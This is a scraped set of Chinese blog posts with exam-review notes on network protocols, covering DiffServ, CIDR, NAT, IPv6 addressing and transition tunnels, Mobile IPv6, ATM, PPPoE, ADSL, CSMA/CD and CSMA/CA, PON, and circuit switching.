在支持区分服务的网络中，由网络管理员事先在每个路由器上设置行为集合（DSCP）所对应的PHB 数据传输 应用P直接向接收主机B发送分组，分组到达R1首先进行分类，标记其DSCP为101110，判断其速率是否大于1Mbps，如果是，则进行丢弃整形。R2、R3根据分组DSCP执行相应的PHB，即以1Mbps的速率转发分组 • PHB（逐跳行为）： 在每个节点上描述根据DSCP对特定行为集合（类）进行资源分配的方式，具体由相应的流量控制（队列管理和调度）来实现\nEFPHB，加速转发型PHB 提供低丢失率、低延时和低延时抖动的服务 严格限制EF分组到达路由器的速率小于设定的路由器转发EF分组的速率 通过在位于网络入口的路由器上限制进入的EF分组不超过某一最大速率，从而实现对EF分组速率的限制 EF由具体的调度算法来实现 推荐DSCP为101110（46） AF确定转发型PHB 比尽力更好的PHB，为用户提供不同级别的转发保证,定义了四个等级，每个等级定义了3个丢弃优先级 DSCP 服务等级/丢弃优先级 等级 1 等级 2 等级 3 等级 4 低 001010 010010 011010 100010 中 001100 010100 011100 100100 高 001110 010110 011110 100110 IP分组转发保证取决于: 多少资源分配给此分组所属的AF等级,以及此AF等级当前的负载和拥塞情况 分组的丢弃优先级 ![[Pasted image 20240102171449.png]] 试图结合综合服务和区分服务的优点\n综合服务提供细粒度的以流（Flow）为单位的QoS，并且通过资源预留能够保证端到端的QoS,适用于规模较小的接入网络 区分服务通过对流进行聚类（BA），并且在路由器上事先设置分组的处理规则（PHB），具有更好的可扩展性,适用于业务流量大的核心网 在6to4网络中，IPv6地址的前32位是固定的2002，接下来的32位是IPv4地址的16进制表示。因此，路由器R的IPv4地址238.136.16.1对应的16进制表示为EE88:1001。所以，我们可以给子网W1和W2分配的6to4子网前缀如下：\n子网W1的6to4子网前缀：2002:EE88:1001:1::/64 子网W2的6to4子网前缀：2002:EE88:1001:2::/64 ","date":"2024-01-02T18:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%94%E7%AB%A0/","title":"信息网络协议基础第五章复习"},{"content":" CIDR •CIDR：Classless Inter-Domain Routing，无类别域间寻路\n目前Internet采用的IP地址分配方式，1990年代由IETF提出，取代早期的有类别的地址分配方式 采用可变长度的网络前缀(network prefix)来取代地址分类中网络号长度固定的做法 具有相同前缀的IP地址组成CIDR Block，表示为A.B.C.D/N，其中N为前缀长度 例如202.38.208.0/20 前缀汇聚(Supernetting) 前缀汇聚举例 8个连续的/24的CIDR Block可以用一个/21的CIDR Block来表示，因此对外汇聚成一条/21的路由 200.25.16.0/24200.25.23.0/24\u0026ndash;〉\n(0001 00000001 0111)\n200.25.16.0/21\n前缀最长匹配(Longest-prefix Match) 在CIDR中，如果路由器上的路由表中有多条表项满足要求，则采用前缀最长匹配规则 前缀最长匹配：R0上对于目的地址为200.25.22.32的IP分组分组，匹配的路由表表项包括200.25.16.0/21和200.25.22.0/24，但使用最长匹配规则选择200.25.22.0/24 NAT 根据作用范围的不同，分两种IP地址\n全局IP地址：用于Internet上的分组转发，要求在Internet范围内唯一， 私有IP地址：用于指定网络内的分组转发，只要求在指定网内部唯一 基本NAT：只使用IP地址信息 最简单的NAT还是需要多个全局的IP地址，一般在NAT设备上维护一个address pool，address pool中地址的数量应该多于有访问外部网络需求的主机的数量。\n网络地址和端口转换NAPT 最常用的一种NAT方式 使用IP地址和TCP/UDP端口号 NAPT操作不仅仅要修改分组的IP头标，还要修改TCP/UDP头标中的端口号 在NAT设备上，虽然内部网络所有的主机共享同一个全局IP地址，但是经过NAT之后不同会话使用的端口号不同 局限性 地址和端口转换将带来比较大的开销 IP地址和端口号可能存在于载荷的任何位置，因此需要软件针对具体的应用做额外的处理 并不是所有的数据都是使用UDP或者TCP来传输 破坏了原有的主机到主机的通信模型 IPv6地址 目前所有IPv6子网的前缀长度都是64比特！\n类型 单播地址(Unicast) 分配给节点上的某个特定网络接口,目的地为单播地址的分组被转发到该接口上 组播/多播地址(Multicast) 分配给一组网络接口，这些网络接口一般位于不同的节点，目的地为组播地址被转发到这组接口上 任播地址(Anycast) 分配给一组网络接口,这些网络接口一般位于不同的网络节点，目的地为任播地址的分组被转发到该组接口中距离发送主机最近的节点(依据路由协议度量的最近距离) Anycast 地址从单播地址空间分配，只能被分配给路由器，并且不能用作源地址，用于基于UDP的DNS查询（无状态，无连接），应用范围：站点范围，全局使用还需进一步考虑 单播地址 有些机制，特别是自动配置机制，所需的信息在子网范围内都可以获得，例如获取目标的MAC地址、获取子网前缀等，不需要全局的IPv6地址\n链路局部地址（Link-Local）：作用范围为链路，在链路范围内分配 前面10比特固定为1111 1110 10，接下来为54比特的0，具有形式FE80:/64 Interface ID：标识主机上的特定接口 链路局部地址总是自动配置，只用于链路范围内的数据传输 唯一本地地址（Unique Local）：与IPv4私有地址类似，一般限制在组织机构内部使用，但不会被转换成全局单播地址 全局（Global）：作用范围为全局，在全局范围进行分配 ![[Pasted image 20240102122226.png]] 前面3比特固定为001，第1个16比特为2000到3FFF Global Routing Prefix：全局路由前缀，由服务提供商(ISP)分配给用户站点（Site）的前缀 Subnet ID：标识特定的子网，一个站点中可能有多个子网 Interface ID：标识主机上的特定接口，大多数情况下长度为64 单播地址的组成 ![[Pasted image 20240102122046.png]]\n组播地址 前面8比特固定为1111 1111，具有形式FF::/8 Flags 4bit: 指示组播地址是永久的还是临时的等信息 Scope 4bits：指示组播的范围 0010 Link-local scope Group ID 112bits：标识组播组，在Scope作用范围内唯一 常用组播地址 全节点地址： FF02::1(link-local) 全路由器地址: FF02::2(link-local) 被请求节点地址（Solicited-node address） 例如: 4037::01:800:200E:8C6C ➡️FF02::1:FF0E:8C6C IPv6组播地址到MAC地址映射 网络接口维护一个感兴趣的目的MAC地址列表，包括\n接口的单播MAC地址 广播MAC地址FF:FF:FF:FF:FF:FF IPv6组播地址所对应的MAC地址(如果网络接口所在节点加入到组播组，有些组播组是必须加入的，例如全节点组播组，被请求节点地址对应的组播组) 例子： IPv6主机具有MAC地址00:AA:00:3F:2A:1C（链路局部地址为FE80:2AA:FF:FE3F:2A1C），其网络接口感兴趣的目的MAC地址表除包含广播MAC地址 FF:FF:FF:FF:FF:FF外，还包括以下组播MAC地址： 33:33:00:00:00:01，对应着链路局部范围内的全节点组播地址FF02::1 33:33:FF:3F:2A:1C，对应着被请求节点地址FF02::1:FF:3F:2A1C 特殊地址 未指明地址：全0(::) 没有有效地址的时候使用 回环地址（::1） 指代网络节点本身 IPv6网络中的邻居发现机制 邻居发现机制基于ICMPv6消息实现，通过ICMPv6消息管理同一链路上的节点到节点通信（网络层机制） 用于邻居发现的ICMPv6消息的IPv6地址为链路局部地址，Hop limit为255，从而将邻居发现消息限制在链路范围内 邻居发现机制中地址的选择遵循以下原则：\n源地址：如果节点没有任何有效地址，那么发数据时使用::作为源地址 目的地址：如果节点不知道目的的任何地址包括IPv6地址，则使用FF02::1或者FF02::2 如果节点知道目的的IP地址，但不知道MAC，则使用该IP地址对应的被请求节点地址 地址解析 确定邻居节点的链路层地址（MAC地址）\n通过在节点之间交换邻居请求(NS)和邻居公告(NA)消息来完成 网络层机制：NS和ND均为ICMPv6消息 过程 判断是否需要进行地址解析过程 每个节点维护邻居缓存：邻居IPv6地址\u0026lt;\u0026mdash;\u0026gt;MAC地址 查找邻居缓存 根据需要开始地址解析过程 发送节点发送邻居请求（NS）：组播发送，包含要解析的IPv6地址（目标地址） 目标节点接收并处理NS，响应邻居公告（NA））：单播发送，包含目标节点MAC地址 发送节点更新邻居缓存 例子 ![[Pasted image 20240102135406.png]] ![[Pasted image 20240102135501.png]] 地址重复检测 自动配置地址最重要的是保证地址不重复 为什么IPv6地址只要保证在链路上不重复就可以？ 地址重复检测 (DAD)：基于邻居请求（NS）/邻居公告（NA）来实现 节点发送NS，其中包含要检测的IPv6地址 如果收到相应的NA，则检测到重复，节点不会使用重复的地址，否则开始使用该IPv6地址 检测到地址重复后的具体处理依赖于实现 ![[Pasted image 20240102135711.png]] ![[Pasted image 20240102135736.png]] 路由器发现 相关消息\n路由器公告消息（RA） 路由器请求消息（RS： Router Solicitation） 具体过程\n被动式 IPv6路由周期性（例如200s）公告RA：组播发送，使用FF02::1 同一链路上的IPv6主机接收RA消息，并且使用其内容来配置或者维护网络参数设置 主动式 IPv6主机主动发送路由器请求RS：组播发送，使用FF02::2 同一链路上的路由器响应RA：单播或者组播方式发送 ![[Pasted image 20240102140212.png]]\n![[Pasted image 20240102140307.png]]\nIPv6地址自动配置过程 IPv6节点上地址自动配置过程（基于EUI-64地址） 1.路由器发现过程：主机发送路由器请求（RS）消息，路由器响应路由器公告（RA）消息，获取子网前缀等信息 2.基于FE80::/64 和 EUI-64地址生成的接口标识生成链路局部地址，设置为尝试（Tentative）状态 2.执行地址重复检测(DAD)过程 3.若DAD成功，将其设置为有效（Valid/Preferred）状态 4.将链路局部地址的被请求节点地址所对应的组播MAC加到网络接口的感兴趣MAC地址表中 5. 根据RA中包含的其它信息进行缺省路由等网络参数的配置 全局 IPv6 地址=IPv6 前缀 64bits+lpv6 接口标识 64bits eg.BC:AE:C5:C2:07:21 一、IPv6借口标识生成\nMAC地址 U/L 位取反：BC（1100):AE:C5:C2:07:21- BE （1110):AE:C5:C2:07:21 第三个和第四个字节之间插入 FFFE，变为BE-AE-C5-FF-FE-C2-07-21 写成冒号 16 进制,BEAE:CSFF:FEC2:721 二、全局 IPv6地址:2002:1:0:3:BEAE:C5FF:FEC2:721 路由表 每个路由器和主机都维护路由表（转发表） \u0026lt;目的网络/目的主机、下一跳IP地址、…..\u0026gt; IPv4/IPv6过渡机制 手工配置隧道 对每个IPv6分组，都事先手工配置它所对应的隧道的端点，主要是用于隧道封装所需的IPv4地址 自动配置隧道 分组中所包含的IPv6地址和/或路由的下一跳决定隧道的端点，主要是指用于隧道封装所需的IPv4地址 ISATAP 0:5EFE:w.x.y.z，w.x.y.z为私有单播IPv4地址 200:5EFE:w.x.y.z w.x.y.z为公共（全局）单播IPv4地址 eg，RI 为ISATAP路由器，为支持 IPv6-in-IPv4 隧道，R1 在网络1中公告IPv6 前缀 2002:1:0:1::/64，主机 A的IPV4地址：160:0:0:2，主机 A 的 ISTAP地址？ 全局：2002:1::1:200:5EFE:160.0.0.2或2002:1:0:1:200:5EFE:160.0.0.2 链路局部：FE80::200:5EFE:160.0.0.2 试着写出ISSTAP路由表，假设前缀为2001:DB8:0:7::/64 host：\n2001:DB8:0:7::/64. On-Link 同一网段的路由器 FE80::200:5EFE:路由器端口ipv4 router\n2001:DB8:0:7::/64. On-Link 不同的端口 \u0026lt;\\下一个router的前缀，连接下一个router的端口ip\u0026gt; 如果没有前缀，就写为::/0 6to4 根据分配给组织机构的全局（公共）IPv4地址，可以生成并且使用48比特全局IPv6地址前缀（2002:WWXX:YYZZ::/48）\n路由一定有一条：2002:/16 On-Link Throughthe 6to4 Interface host指向同一网段的路由器\n2002:xxxxx router指 目的，下一跳 \u0026lt;\\下一个router的前缀，连接下一个router的端口ip\u0026gt; –手动隧道配置、自动隧道（ISATAP、6to4）原理和配置 ","date":"2024-01-02T16:12:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%89%E7%AB%A0/","title":"信息网络协议基础第三章复习"},{"content":"移动切换 两种切换情况 切换涉及的AP在同一个网络中-链路层切换 链路层切换不改变IP地址，执行链路层操作 不改变五元组，对应用会话无影响 切换涉及的AP在不同的网络中-网络层切换 不同网络不同AP之间的切换首先执行链路层切换，再执行网络层切换，进行网络相关参数配置 移动节点IP地址发生变化 如何消除切换对应用会话的影响？ 应用层解决方案：需要应用支持，本质上是重新建立IP会话 网络层解决方案：需要增强网络协议，对应用透明 应用会话大多通过五元组来标识 \u0026lt;源/目的IP地址、协议、源/目的端口号\u0026gt; 不同的五元组对应着不同的应用会话 移动IPv6 – 基本原理、如何对上层应用屏蔽移动性？\n基本关键词 家乡地址(HoA)：移动节点的标识，手动配置或者由家乡网络分配，通常不变 转交地址(CoA)：移动节点位置的标识，由移动到的外地网络分配，随位置变化 HoA与CoA的对应关系称为绑定(Binding)\u0026lt;HoA, CoA\u0026gt; 家乡代理(Home Agent)：保存移动节点的家乡地址和转交地址之间的映射关系(绑定) IP分组先发送到家乡代理，由家乡代理发送给移动节点！ 过程 移动检测 移动节点检测到自己移动到了外地网络 路由器公告 转交地址配置 \u0026lt;家乡地址、转交地址\u0026gt;的绑定注册 到家乡代理 到通信对端 家乡代理拦截到移动节点地址的分组 对IP以上层屏蔽移动性 双向隧道模式 移动节点和通信对端的通信始终使用家乡地址进行通信 移动节点的移动由家乡代理跟踪，对于通信对端来说是透明的 所有的通信都必须通过家乡代理转发 路由优化模式 通信对端知道移动节点当前的转交地址。 PMIPv6 引入原因• 为什么引入代理移动IPv6？\n更加易于部署 更加易于管理 更好的性能 原理 网络端控制的移动管理 在网络中引入一个功能实体代理移动节点执行与家乡代理之间的信令 本地移动管理 在本地管理域中引入一个类似家乡代理的功能实体，负责管理域内的移动管理操作 ","date":"2024-01-02T13:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E7%AC%AC%E5%9B%9B%E7%AB%A0-ip%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86/","title":"信息网络协议基础第四章复习"},{"content":"接入网 用来把用户网络或者设备接入到Internet的网络 也被称为最后1公里接入 宽带接入成为主流（FCC [2010]: 4Mbps downstream/1Mbps upstream) DSL、Cable、Fibre、Wireless Broadband (Fixed/Mobile) 常用接入网类型 基于ATM架构类 传统电信网络：点对点 DSL（数字用户线路） 对称DSL 下行和上行速率相同SHDSL(利用了话音带宽） 非对称DSL 下行速率一般大于上行速率 ADSL ADSL2+: 基于IEEE 802参考模型的局域网架构类 新兴IP网络：共享 以太网（802.3）、无线局域网（802.11）、甚至包括无线城域网（802.16） 光纤接入类 基于ATM：APON、GPON 基于以太网：EPON ATM 概述 ATM： Asynchronous Transfer Mode，异步传输模式\n既可用于接入网，也可以用于核心网 面向连接的分组交换/虚电路交换\nQ.2931：连接建立信令 信元：基本交换单位，固定长度（5字节头标＋48字节数据） ==为什么选择固定长度（53字节）的信元？== ==1）构建硬件简单== ==2）交换单元并行处理== ==3）队列行为优化：控制延迟、提高队列处理效率== 信元 队列优化举例： 假设：链路带宽100Mbps，队列中的分组具有不同的优先级 变长分组网络：最大分组长度为4KB，在交换机开始传输一个4KB的分组之后到达一个高优先级的分组，必须在队列中等待327.68us才能通过输出端口传输（4KB= 32768b） ATM网络：信元固定长度为53B，最长等待时间将是53×8/100=4.24us，而且这个时间是固定的 结论：使用固定长度信元具有控制延迟的能力，特别是控制延迟抖动的能力，这对某些应用例如实时应用非常重要\n业务类型 CBR业务 Constant Bit Rate 提供最高程度的服务质量保证，保证带宽、延迟抖动 话音、视频等 VBR业务 Variable Bit Rate 业务产生的数据可能是突发的，要求延迟抖动小 具有突发性，可保证最大延迟，压缩话音、视频 ABR业务 Available Bit Rate 利用剩余带宽，根据网络可用带宽和拥塞状态来调整传输速率 文件传输、email等 UBR业务 Unspecified Bit Rate 利用剩余带宽，对延迟和延迟抖动没有严格要求的业务 文件传输、email等 虚电路 虚电路VPI和VCI来标识 VPI：Virtual Path Identification，虚路径标识 VCI：Virtual Channel Identification，虚通道标识 Why VPI+VCI？ VPI用于网络的主干中进行切换。它在ATM交换机上起到多路复用/解复用的作用，将来自各种源（ATM接口）的虚拟信道（VCs）汇聚到一个接口上的虚拟路径 另一方面，VCI用于在私有网络内标识连接。 Permanent Virtual Circuit (PVC) PVC是一种永久建立的连接，它使得在节点之间的物理连接上创建逻辑连接成为可能，这些节点经常或连续地进行通信 网络设备的VPI/VCI表格可以由管理员进行更新 Switched Virtual Circuit (SVC) Switched Virtual Circuit (SVC) 是一种在数据通信网络中在两个网络设备之间建立的临时逻辑连接 信元格式 ![[图片 1.png]]\nAAL 信元载荷的格式由AAL来决定 AAL：ATM Adaptation Layer，ATM适配层 Why AAL？ ATM可以用来承载可变长度的分组（例如IP分组），而ATM信元长度是固定的。 ![[Pasted image 20240102101545.png]] •根据传输业务的不同，分为AAL1～AAL5 AAL1：CBR、面向连接业务，例如恒定速率的音频和视频 AAL2：VBR业务，面向连接的业务，例如可变速率的音频和视频 AAL3/4：VBR、面向连接和无连接业务 AAL5：AAL3/4的简化版。最常用，用来承载IP分组 ATM与点对点链路 在电话线接入中 服务提供商事先给每个客户都事先分配了固定的VPI/VCI，大多使用PVC 为了便于管理，服务提供商一般通过PPP over ATM技术，将PVC变成一个逻辑的点对点链路集合 PPP 概述 PPP是个数据链路层协议 ，通过PPP，完成： 链路建立、维护和终结 用户认证 网络参数协商，包括IP地址分配等 对于接入服务器来说，每条PPP链路的另一端对应着一个用户，因此便于认证、计费和管理 PPP链路的两端对应着通信双方，因此不存在寻址问题 接入服务器要和AAA服务器(例如RADIUS)配合工作，以完成认证、计费等功能 AAA：认证、授权、计费 协议 PPP：Point to Point Protocol 在点对点链路上传输多种协议数据 协议构成 封装方法 封装各种协议数据的方法 在同一条链路上同时复用各种不同的网络层协议 链路控制协议（LCP：Link Control Protocol） 建立、配置、维护和终结链路 认证协议 PAP、CHAP 网络控制协议（NCP：Network Control Protocol） 建立和配置各种不同的网络层协议 对于不同的网络层协议定义有不同的NCP，例如对于IP协议是IPCP 说明 PPP over ATM缺乏有效的QoS和组播支持能力 业务均为ATM UBR类型，提供尽力服务 视频、高质量音频、实时视频会议等服务质量要求高的应用必须选择原始的ATM协议栈 ADSL 概述 早期电话拨号：局端过滤300Hz~ 3.4KHz 范围外的非话音频率 电话线的带宽\u0026gt; \u0026gt;4kHz（可用带宽2MHz左右。 ADSL：ADSL将用户线路接到没有滤波器的线路上 频率在26khz以上的信号被分离到DSLAM(用户数字线访问复用) 关键技术 调制技术：DMT 关键设备：DSLAM 体系结构：ATM、PPPOE 现在大多使用ADSL Router取代ADSL MODEM，可以由ADSL Router直接进行PPPOE拨号；也可以是ADSL Router+宽带路由器，由宽带路由器执行PPPOE拨号。\nDMT DMT：离散多音（Discrete Multi-Tone），用于ADSL的调制方法 利用电话线的1104KHz带宽，划分为256个载波（多音，子信道），每个子信道带宽为4.3125KHz 子信道0（0～4.3125KHz）：传统电话业务 子信道1~5（4.3125～25.875KHz）：保护频带 子信道6～31（25.875～138KHz）：26个上行信道 子信道32～255（138～1104KHz）：224个下行信道 双向数据传输时，为了避免上行和下行之间的干扰，在31～32附近的信道不被使用（保护频带，位于138KHz左右） 速率自适应：DMT以自适应的方式分配各个子信道的速率，以达到最佳的传输线路利用率，例如让信噪比较高的信道传送更多的位，关闭被窄频噪声所覆盖的子信道 ADSL带宽分析 DSLAM DSLAM：Digital Subscriber Line Access Multiplexer，数字用户线路访问复用器 将基于各种DSL技术的数字用户线路，包括ADSL，VDSL和SH.DSL，连接到运营商网络 DSLAM分为两侧，即用户侧和网络侧 用户侧：DSLAM和Modem之间始终为ATM over DSL，即来自主机的以太帧被封装成ATM信元，然后通过DSL传输 网络侧：早期为ATM，但是随着IP的普及，ATM逐渐被以太网所取代，这也代表了DSLAM的发展方向（IP化） PPPOE Why PPPOE? 用户希望能够通过一个CPE设备（用户前端设备，例如ADSL Modem）来接入多台主机 实际网络运行经验表明，以太网（Ethernet）是一种有效而且成本很低的多主机接入技术，但是以太网不支持认证、计费等功能。运营上同时希望能够实现基于用户的访问控制和计费功能。在传统的拨号网络中，通过PPP可以对用户进行认证、计费 一个自然的想法就是把以太网和PPP这两种技术结合起来，因此引入了PPPOE（PPP over Ethernet），在以太网上建立PPP连接，本质是在多路访链路上提供一条逻辑的点对点链路，也被称为PPPOE会话。 PPPOE分为两个阶段 发现阶段 为了在以太网上建立PPP会话，通信双方必须知道对方的MAC地址，并且协商一个唯一的会话标识（Session_ID） 主机发现网络中所有可用的BRAS（MAC地址），并且选择一个BRAS为其提供接入服务 无状态，不会分配任何资源 PPP会话阶段 标准的PPP过程，当PPP会话建立后，主机和BRAS为PPP会话分配资源 PPPOE帧格式 类型: 0x8863 用于Discovery阶段的帧 0x8864 用于PPP会话阶段 Code：0x00 PPP会话阶段、0x09 PADI、0x07 PADO、0x19 PADR、0x65 PADS、0xa7 PADT\nPPPOE的特点 通过PPPOE会话的建立和释放进行基于时间或者流量的统计，计费方式灵活方便 动态IP地址配置和管理 与传统拨号上网类似，提供基于用户名和密码的认证 由于存在多层协议封装，开销大 局域网 定义 局域网（LAN：Local Area Network）被定义为一个广播域，即在局域网内目的地址为广播地址的IP分组或者数据链路层帧会被所有的网络节点接收和处理 以太网是应用最广泛的局域网技术，对应着IEEE 802.3\n局域网参考模型 数据链路层被划分为两个子层，即逻辑链路控制(LLC)子层和媒介访问控制(MAC)子层 在传统的点对点链路控制中没有管理访问共享媒介的逻辑需求 ， MAC子层负责对共享链路访问进行控制 对于相同的LLC子层，可以提供不同的MAC子层 常用以太网、无线局域网等局域网具有相同的LLC子层，只是MAC子层不同 LLC 功能：传输服务/ 到上层的服务接口/流量控制等 LLC是一个对所有LAN都相同的链路层协议，它定义了两个用户之间数据交换的机制，提供了三种可选的服务 无确认的非连接服务（Unacknowledged Connectionless Service） 连接模式服务（Connection-mode Service） 确认无连接服务（Acknowledged Connectionless Service） 设备厂商将LLC服务作为可选项提供给客户，客户可以根据自己应用的需求选择合适的服务 在大多数情况下，无确认的非连接服务是优先考虑的选项，但在一些不可靠的网络环境，例如无线网络，一般使用确认无连接服务 MAC 功能：寻址/访问控制/差错控制/移动管理等\n重点解决共享链路访问控制问题，具体的MAC机制与传输媒介的物理特性相关\n有线：以太网、光网络等 无线：无线局域网、无线城域网等 CSMA/CD是最经典的MAC机制，在以太网（802.3）中使用\n为什么引入MAC\n寻址问题：在共享链路上，任何主机都能够接收其它主机发送的数据，因此需要一种机制来指明数据的接收者 主机发送数据时以帧为单位，帧的头标中包含了接收这个帧的目的地址，即目的MAC地址 共享链路问题 访问控制问题：在共享链路上，需要一种机制协调所有主机之间的数据发送，以公平竞争访问链路。 解决方法：每个数据帧都有最大长度限制（数据域部分不超过1500字节），发送完后主机之间要重新使用CSMA/CD机制协调对共享链路的访问 冲突 也叫做碰撞，由多台主机争用传输介质引起的。当连接在共享链路上的两台或两台以上主机同时发送数据时，表示这些数据的信号将在同一段传输介质上叠加，从而导致无法被接收主机正确接收。 CSMA/CD 载波侦听（Carrier Sense）：当某台主机想要发送数据时，它首先侦听媒介是否忙，如果是，表示当前有其它主机正在传输数据，因此将继续侦听，直到媒介空闲，然后发送数据 冲突检测（Collision Detection）：如果主机在数据发送过程中检测到冲突，则发送干扰信号（jamming signal），以确保所有主机都知道发生了冲突，并且取消发送 当检测冲突后，将等待一个随机的时间，也称作退避（backoff） 二进制指数退避算法（binary exponential backoff）来确定随机等待时间时间被划分为离散的时槽，一般设置为51.2us 当第k次冲突发生后，从集合{0，1，….，2k-1}中随机选择一个数r，然后等待r个时槽。如果k\u0026gt;=10，则保持集合{0，1，….，210-1} 不变。如果k\u0026gt;16，则放弃发送，并产生错误 分布式协调功能DCF（Distributed Coordination Function） 冲突避免CA而不是冲突检测CD，在无线环境下很难检测到冲突 两种CSMA/CA操作\n基本CSMA/CA：采用物理信道侦听方法 ，该操作强制要求必须使用 扩展CSMA/CA：采用虚拟信道侦听方法，使用两个控制帧，即RTS/CTS，可解决隐藏站点问题，该操作是可选的，可以根据需要配置 基本CSMA/CA 包括载波侦听和冲突避免两个过程 载波侦听 ：站点在发送帧之前侦听无线信道是否空闲，如果是，则进入冲突避免阶段，如果当前信道忙，说明现在有其它站点正在传输数据，则延迟发送帧直到侦听到信道空闲 冲突避免：站点在发送帧之前要先等待一个帧间间隔IFS（InterFrame Spacing），并且确保在IFS时间内信道空闲 为了防止多个站点在等待IFS时间后同时发送而导致冲突，与以太网类似，引入了一个随机退避算法来选择一个退避时间 （backoff time） IFS 帧间间隔（IFS）控制了发送帧之前的等待时间，不同类型的帧具有不同的IFS，确定了帧的发送优先级，IFS越短，帧的优先级就越高 。 三种IFS\nSIFS：Short IFS，最高优先级，用于CTS、ACK等控制帧 PIFS：PCF IFS，等于SIFS+1，中等优先级，用于PCF操作模式下的帧 DIFS：DCF IFS，等于SIFS+2，最低优先级，用于DCF操作模式下的数据帧 退避时间 站点执行随机退避算法来确定退避时间 从0到竞争窗口CW之间的随机选择一个值r，则退避时间为r倍的时槽 竞争窗口CW（Contention Window ）采用与以太网类似的指数退避算法来设置 CW初始化为一个最小值CWmin 当发送方认为发送的帧发生冲突时将CW加倍增大，直到到达最大值CWmax 竞争窗口CW: 开始为2k-1，下一次为2k+1-1 判断冲突 .接收方发送ACK帧 接收方正确接收来自发送方的数据帧后发送ACK帧进行确认 ACK帧不需要执行随机退避算法，而是直接等待一个SIFS时间后就发送 发送方未收到ACK帧 发送方执行指数退避算法，将CW的值加倍，并且将重传计数器加1，然后重传数据帧，此时需要再次使用CSMA/CA机制竞争信道 CW从CWmin开始，每次重传都将CW加倍，直到到达CWmax 重传计数器到达一个设定的门限值时，发送方将放弃发送数据帧，并且返回一个错误 扩展CSMA/CA RTS帧：与数据帧发送方式相同 CTS帧：与控制帧发送方式相同，等待SIFS时间后直接发送 网络分配向量（NAV：Network Allocation Vector）：设置计数器，当减为0后，其他站点开始竞争信道 只有当RTS/CTS中的持续时间域的值大于当前存储的NAV时，该NAV才会被更新 原理 ![[Pasted image 20240102111606.png]]\n发送方发送RTS帧，其中包含了一个持续时间域，该域的值表明发送方完成帧交换所需要的时间，包括从发送数据帧到接收ACK帧所需要的时间 收到RTS的站点根据其中的持续时间为自己声明一个虚拟信道，并且该信道正忙，用网络分配向量NAV来表示，在NAV时间内，该站点不会尝试发送帧 接收方响应CTS帧中也包含一个持续时间域，该域的值足够大，以保证发送方能够完成数据帧交换 收到CTS的站点根据其中的持续时间为自己声明一个虚拟信道，并且该信道正忙，用网络分配向量NAV来表示，在NAV时间内，该站点不会尝试发送帧 为什么要拓展 基本CSMA/CA存在：\n隐藏站点问题：B给C发，D无法侦听到 暴露站点问题：B给A发，C侦听到忙，无法给D发 扩展CSMA/CA可解决隐藏站点问题 B和D在彼此通信范围之外，他们互为隐藏站点，当B往C发送时，D CD失败，反过来D往C发送时，B CD失败。基本的CSMA/CA机制无法解决隐藏站点问题 切换 •站点移出一个AP的信号覆盖范围外，进入另一个AP的信号覆盖范围内，这时它需要关联到一个新的AP上。这个过程被称为切换（Handoff）\n切换过程 首先，站点决定何时开始切换过程 信号强度减弱 帧重传 基础设施网络中无法接收到AP周期性广播的信标帧（缺省情况下AP周期性广播信标帧，其中包含有SSID等信息） 其次，站点决定切换到何处 通过扫描机制得到所有AP的信息 主动扫描速度快,但是开销大,目前大多数802.11产品都采用主动扫描 主动扫描(Active Scanning)：在每个信道上发送探测请求帧，然后等待来自工作在该信道上的AP的探测响应帧，从而得到所有信道上的所有AP信息 被动扫描(Passive Scanning): 在每个信道上侦听来自AP的信标帧，从而得到所有信道上的所有AP信息 根据SSID是否匹配、信号强度等信息选择一个新的AP 最后，站点将和选择的新的AP建立关联。建立关联之前STA还要和新的AP进行认证过程，然后开始关联过程 在这里站点发送的是重新关联帧（Reassociation ）而不是关联帧 PON关键技术 下行采用广播方式传输，为保证安全性，需要对数据进行加密 上行需要考虑TDMA同步问题 实现动态带宽分配，提高带宽使用率，保证多业务服务质量 PON要解决的关键问题就是如何控制多个ONU/ONT对共享馈线光纤的高效访问 GPON vs EPON EPON直接将变长IP分组封装成以太帧，效率高，实现简单 GPON帧长为125us，无缝支持TDM业务 GPON继承了ATM的多业务支持，以业务类型为单位分配带宽 动态带宽分配属于GPON标准的一部分，但是在EPON中没有明确定义 GPON能够提供更高的速率，接入更多的ONU/ONT（最多128个）\n","date":"2024-01-02T11:54:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/","title":"信息网络协议基础第二章复习"},{"content":"交换技术 交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP）- 原理 特点 为什么需要交换？ 减少网络中节点之间所需的通信线路 增强可扩展性,构建更大规模网络\n交换类型 ![[Pasted image 20240101134814.png]]\n交换的概念 交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上 网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成\n电路交换 电路交换：概念 交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径 传输路径建立后，数据像流一样在路径上传输 空分交换：传输路径由线路组成 时分交换：传输路径由每条线路上的固定时隙组成 电路交换：特征 网络通信包括三个过程\n（发送）端到（接收）端电路连接建立 数据传输 电路连接拆除 优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性 缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟 电路交换：性能 电路交换是为话音传输设计的，支持固定的数据速率 